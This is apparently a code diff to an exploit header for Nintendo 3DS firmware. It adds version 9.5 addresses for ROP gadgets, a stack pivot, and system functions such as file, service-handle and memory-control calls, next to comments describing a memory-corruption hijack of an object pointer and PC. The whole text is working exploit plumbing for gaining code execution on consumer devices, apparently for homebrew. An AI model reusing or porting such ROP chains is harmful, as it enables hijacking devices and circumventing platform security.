@@ -15,15 +15,17 @@ L_2441a0: L_1e95e0(*(inr0+4)); ...
 L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from objectptr> ...//This is where this haxx finally gets control over an objectptr(r0) + PC at the same time.
 */
 
-#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.4 all regions)
+#if SYSVER<96
+#define STACKPIVOT_ADR 0x00100fdc //7814bd30 ldmdavc r4, {r4, r5, r8, sl, fp, ip, sp, pc} (same addr for v9.1j - v9.5 all regions)
+#else
+#define STACKPIVOT_ADR 0x00100fb8
+#endif
 
-#if SYSVER>=93 //v9.3-v9.4
-#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
-#define ROP_POPPC 0x10203c
+#if SYSVER==93 || SYSVER==94
 #define POP_R4LR_BXR1 0x0011df68 //"pop {r4, lr}" "bx r1"
-#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
 #define POP_R4R8LR_BXR2 0x00133f8c //"pop {r4, r5, r6, r7, r8, lr}" "bx r2"
-#define POP_R4R5R6PC 0x00101b94 //"pop {r4, r5, r6, pc}"
+
+#define NSS_RebootSystem 0x00136a0c
 
 #define CFGIPC_SecureInfoGetRegion 0x00136ea4 //inr0=u8* out
 
@@ -32,13 +34,36 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 #define APT_SendParameter 0x00214ab0 //inr0=dst appid inr1=signaltype inr2=parambuf* inr3=parambufsize insp0=handle
 
-#define NSS_RebootSystem 0x00136a0c
-
 #define FS_MountSdmc 0x0011cacc //inr0=archivename*
 
 #define IFile_Open 0x00218c04 //inr0=ctx inr1=utf16* path inr2=openflags
 #define IFile_Close 0x0021dcbc //inr0=ctx
 #define IFile_Read 0x00218b1c //inr0=ctx inr1=u32* total transferred data inr2=buf inr3=size
+#elif SYSVER==95
+#define POP_R4LR_BXR1 0x0011df5c
+#define POP_R4R8LR_BXR2 0x00133f80
+
+#define NSS_RebootSystem 0x00136a00
+
+#define CFGIPC_SecureInfoGetRegion 0x00136e98
+
+#define GSPGPU_Shutdown 0x0011dc10
+#define GSPGPU_FlushDataCache 0x0014ab8c
+
+#define APT_SendParameter 0x00214a3c
+
+#define FS_MountSdmc 0x0011cac0
+
+#define IFile_Open 0x00218b90
+#define IFile_Close 0x0021dc48
+#define IFile_Read 0x00218aa8
+#endif
+
+#if SYSVER>=93 //v9.3-v9.5
+#define ROP_LOADR4_FROMOBJR0 0x10b574 //load r4 from r0+16, return if r4==r5. obj/r0 = r4-32. call vtable funcptr +12 from this obj.
+#define ROP_POPPC 0x10203c
+#define ROP_LDRR1_FROMR5ARRAY_R4WORDINDEX 0x001037fc//"ldr r1, [r5, r4, lsl #2]" "ldr r2, [r0]" "ldr r2, [r2, #20]" "blx r2"
+#define POP_R4R5R6PC 0x00101b94 //"pop {r4, r5, r6, pc}"
 
 #define ROP_COND_THROWFATALERR 0x001028f8//When r0 is not negative, this executes "pop {r3, r4, r5, pc}". Otherwise it executes: "pop {r3, r4, r5, lr}" "b <throwfatalerr func>"
 #else
@@ -64,15 +89,14 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #elif SYSVER == 94
 #define SRV_GETSERVICEHANDLE 0x0022470c
 #define POP_R1PC 0x0022629c
+#elif SYSVER == 95
+#define POP_R1PC 0x00226264
+#define SRV_GETSERVICEHANDLE 0x002246d4
 #endif
 
-#if SYSVER>=93 //v9.3-v9.4
+#if SYSVER==93 || SYSVER==94//v9.3-v9.4
 #define POP_R0PC 0x00154f0c
-#define POP_R3PC 0x00102a40
 #define POP_R2R6PC 0x001512c4 //pop {r2, r3, r4, r5, r6, pc}
-
-#define ROP_STR_R1TOR0 0x00103f58
-#define ROP_LDR_R0FROMR0 0x0010f01c
 #define ROP_LDRR1R1_STRR1R0 0x002003bc
 #define ROP_MOVR1R3_BXIP 0x001c2e24
 #define ROP_ADDR0_TO_R1 0x0012b64c
@@ -82,6 +106,27 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define svcSleepThread 0x0012b590
 
 #define GXLOW_CMD4 0x0014ac9c
+#endif
+
+#if SYSVER==95
+#define POP_R0PC 0x00154ef0
+#define POP_R2R6PC 0x001512b4
+#define ROP_LDRR1R1_STRR1R0 0x002003a0
+#define ROP_MOVR1R3_BXIP 0x001c2e08
+#define ROP_ADDR0_TO_R1 0x0012b640
+
+#define MEMCPY 0x00150930
+
+#define svcSleepThread 0x0012b584
+
+#define GXLOW_CMD4 0x0014ac8c
+#endif
+
+#if SYSVER>=93 //v9.3-v9.5
+#define POP_R3PC 0x00102a40
+
+#define ROP_STR_R1TOR0 0x00103f58
+#define ROP_LDR_R0FROMR0 0x0010f01c
 
 #define ORIGINALOBJPTR_LOADADR (0x0031382c+8) //The ptr stored here is the ptr stored in the saved r4 value in the stackframe, which was overwritten by memchunkhax.
 #endif
@@ -155,6 +200,15 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 #define IFile_Open 0x00209f88
 #define IFile_Close 0x0020c1b0
 #define IFile_Read 0x00209e74
+#endif
+
+#if SYSVER == 95
+#define ROP_CMPR0R1 0x00294698
+#define ROP_INITOBJARRAY 0x00219031
+
+#define svcControlMemory 0x0022467c
+
+#define NSS_LaunchTitle 0x002201b8
 #endif
 
 #if SYSVER == 94
